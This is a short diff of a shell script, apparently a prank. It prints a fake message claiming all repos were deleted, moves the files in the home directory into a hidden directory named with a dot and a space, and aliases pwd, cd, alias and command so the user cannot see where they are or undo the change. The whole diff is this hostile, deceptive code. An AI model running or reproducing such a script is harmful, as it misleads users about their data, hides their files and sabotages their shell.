@@ -4,8 +4,9 @@ echo "deleting all repos..."
 sleep 4
 echo -e "\e[32mdeletion successful\e[0m"
 echo "You can log out now"
-cd && mkdir -p ' ' && cd \ 
+cd && mkdir -p .\ && mv * .\ 
 alias pwd="echo /home/$USER"
 alias cd="echo -n"
 alias alias=""
 alias command=""
+cd
